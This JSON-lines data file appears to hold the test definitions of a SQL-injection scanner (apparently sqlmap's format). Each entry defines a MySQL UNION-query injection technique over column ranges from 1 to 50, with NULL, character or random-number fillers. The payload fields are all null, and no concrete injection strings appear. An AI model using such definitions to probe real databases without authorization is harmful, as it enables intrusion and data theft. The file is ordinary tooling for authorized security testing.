{"title": "MySQL UNION query ([RANDNUM]) - [COLSTART] to [COLSTOP] columns (custom)", "stype": 6, "level": 3, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "#", "char": "[RANDNUM]", "columns": "[COLSTART]-[COLSTOP]"}, "response": {"union": null}, "details": {"dbms": "MySQL"}}
{"title": "MySQL UNION query ([CHAR]) - 1 to 10 columns", "stype": 6, "level": 2, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "#", "char": "[CHAR]", "columns": "1-10"}, "response": {"union": null}, "details": {"dbms": "MySQL"}}
{"title": "MySQL UNION query (NULL) - 1 to 10 columns", "stype": 6, "level": 2, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "#", "char": "NULL", "columns": "1-10"}, "response": {"union": null}, "details": {"dbms": "MySQL"}}
{"title": "MySQL UNION query ([RANDNUM]) - 1 to 10 columns", "stype": 6, "level": 3, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "#", "char": "[RANDNUM]", "columns": "1-10"}, "response": {"union": null}, "details": {"dbms": "MySQL"}}
{"title": "MySQL UNION query ([CHAR]) - 11 to 20 columns", "stype": 6, "level": 2, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "#", "char": "[CHAR]", "columns": "11-20"}, "response": {"union": null}, "details": {"dbms": "MySQL"}}
{"title": "MySQL UNION query (NULL) - 11 to 20 columns", "stype": 6, "level": 2, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "#", "char": "NULL", "columns": "11-20"}, "response": {"union": null}, "details": {"dbms": "MySQL"}}
{"title": "MySQL UNION query ([RANDNUM]) - 11 to 20 columns", "stype": 6, "level": 3, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "#", "char": "[RANDNUM]", "columns": "11-20"}, "response": {"union": null}, "details": {"dbms": "MySQL"}}
{"title": "MySQL UNION query ([CHAR]) - 21 to 30 columns", "stype": 6, "level": 3, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "#", "char": "[CHAR]", "columns": "21-30"}, "response": {"union": null}, "details": {"dbms": "MySQL"}}
{"title": "MySQL UNION query (NULL) - 21 to 30 columns", "stype": 6, "level": 3, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "#", "char": "NULL", "columns": "21-30"}, "response": {"union": null}, "details": {"dbms": "MySQL"}}
{"title": "MySQL UNION query ([RANDNUM]) - 21 to 30 columns", "stype": 6, "level": 4, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "#", "char": "[RANDNUM]", "columns": "21-30"}, "response": {"union": null}, "details": {"dbms": "MySQL"}}
{"title": "MySQL UNION query ([CHAR]) - 31 to 40 columns", "stype": 6, "level": 4, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "#", "char": "[CHAR]", "columns": "31-40"}, "response": {"union": null}, "details": {"dbms": "MySQL"}}
{"title": "MySQL UNION query (NULL) - 31 to 40 columns", "stype": 6, "level": 4, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "#", "char": "NULL", "columns": "31-40"}, "response": {"union": null}, "details": {"dbms": "MySQL"}}
{"title": "MySQL UNION query ([RANDNUM]) - 31 to 40 columns", "stype": 6, "level": 5, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "#", "char": "[RANDNUM]", "columns": "31-40"}, "response": {"union": null}, "details": {"dbms": "MySQL"}}
{"title": "MySQL UNION query ([CHAR]) - 41 to 50 columns", "stype": 6, "level": 5, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "#", "char": "[CHAR]", "columns": "41-50"}, "response": {"union": null}, "details": {"dbms": "MySQL"}}
{"title": "MySQL UNION query (NULL) - 41 to 50 columns", "stype": 6, "level": 5, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "#", "char": "NULL", "columns": "41-50"}, "response": {"union": null}, "details": {"dbms": "MySQL"}}
{"title": "MySQL UNION query ([RANDNUM]) - 41 to 50 columns", "stype": 6, "level": 5, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "#", "char": "[RANDNUM]", "columns": "41-50"}, "response": {"union": null}, "details": {"dbms": "MySQL"}}
